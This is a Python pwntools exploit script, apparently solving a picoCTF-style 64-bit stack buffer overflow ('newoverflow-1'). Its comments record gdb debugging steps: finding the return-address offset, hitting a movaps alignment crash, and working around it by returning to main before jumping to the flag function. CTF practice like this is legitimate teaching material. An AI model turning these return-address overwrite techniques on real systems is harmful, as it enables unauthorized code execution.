import pwn

remote_binary = "/problems/newoverflow-1_4_3fc8f7e1553d8d36ded1be37c306f3a4/vuln"

BUF_LEN = 64
pr = pwn.process(remote_binary)


def detect_segfault():

    """
    gdb ./vuln
    ...
    (gdb) r <<< $(python2 -c "import pwn;print(pwn.cyclic(128, n=8))")
    ...
    Program received signal SIGSEGV, Segmentation fault.
    0x00000000004007e7 in vuln ()
    ...
    (gdb) info stack 
    #0  0x00000000004007e7 in vuln ()
    #1  0x616161616161616a in ?? ()
    #2  0x616161616161616b in ?? ()
    #3  0x616161616161616c in ?? ()
    #4  0x616161616161616d in ?? ()
    #5  0x616161616161616e in ?? ()
    #6  0x616161616161616f in ?? ()
    #7  0x6161616161616170 in ?? ()
    #8  0x0000000000000000 in ?? ()
    ...
    
    >>> pwn.cyclic_find(pwn.p64(0x616161616161616a),n=8)    
    72
    """
    ofs = pwn.cyclic_find(pwn.p64(0x616161616161616a),n=8)

    """
    It doesn't show the flag with
    ```
    payload = b'A'*ofs + pwn.p64(pwn.ELF(remote_binary, False).sym["flag"])
    pr.writelineafter("Welcome to 64-bit. Give me a string that gets you the flag: \n", payload)
    rsp = pr.readall(timeout=0.5)
    ```

    Lets' debug with a fake flag file.
    $ echo "aaaflagaaa" > flag.txt

    $ gdb /problems/newoverflow-1_4_3fc8f7e1553d8d36ded1be37c306f3a4/vuln
    (gdb) r <<< $(python2 -c 'import pwn;print(b"A"*72+pwn.p64(pwn.ELF("/problems/newoverflow-1_4_3fc8f7e1553d8d36ded1be37c306f3a4/vuln",False).sym["flag"]))')
    Starting program: /problems/newoverflow-1_4_3fc8f7e1553d8d36ded1be37c306f3a4/vuln <<< $(python2 -c 'import pwn;print(b"A"*72+pwn.p64(pwn.ELF("/problems/newoverflow-1_4_3fc8f7e1553d8d36ded1be37c306f3a4/vuln",False).sym["flag"]))')
    /bin/bash: warning: command substitution: ignored null byte in input
    Welcome to 64-bit. Give me a string that gets you the flag: 

    Program received signal SIGSEGV, Segmentation fault.
    buffered_vfprintf (s=s@entry=0x7fa4bdc17760 <_IO_2_1_stdout_>, format=format@entry=0x7ffde5d09c58 "aaaflagaaa\n", args=args@entry=0x7ffde5d09b78) at vfprintf.c:2314
    2314    vfprintf.c: No such file or directory.
    (gdb) disas
    Dump of assembler code for function buffered_vfprintf:
    ...
       0x00007fa4bd8896e0 <+144>:   mov    %eax,0xa4(%rsp)
       0x00007fa4bd8896e7 <+151>:   lea    0x389072(%rip),%rax        # 0x7fa4bdc12760 <_IO_helper_jumps>
    => 0x00007fa4bd8896ee <+158>:   movaps %xmm0,0x50(%rsp)
       0x00007fa4bd8896f3 <+163>:   mov    %rax,0x108(%rsp)
    ...
    There is a `movaps` instructions here, according to (x86 Instruction Set Reference MOVAPS)[https://c9x.me/x86/html/file_module_x86_id_180.html], the instruction is used for alignment.
    > Moves a double quadword containing four packed single-precision floating-point values from the source operand (second operand) to the destination operand (first operand). This instruction can be used to load an XMM register from a 128-bit memory location, to store the contents of an XMM register into a 128-bit memory location, or to move data between two XMM registers.

    When the source or destination operand is a memory operand, the operand must be aligned on a 16-byte boundary or a general-protection exception (#GP) is generated.


    To solve this we need to call `main` again before jump to `flag`.
    """
    payload = b'A'*ofs + pwn.p64(pwn.ELF(remote_binary, False).sym["main"])
    pr.writelineafter("Welcome to 64-bit. Give me a string that gets you the flag: \n", payload)

    payload = b'A'*ofs + pwn.p64(pwn.ELF(remote_binary, False).sym["flag"])
    pr.writelineafter("Welcome to 64-bit. Give me a string that gets you the flag: \n", payload)
    rsp = pr.readall(timeout=0.5)

    print('ofs:', ofs);print('rsp:', rsp)
    if "pico" in rsp.lower():
        print(rsp)

detect_segfault()
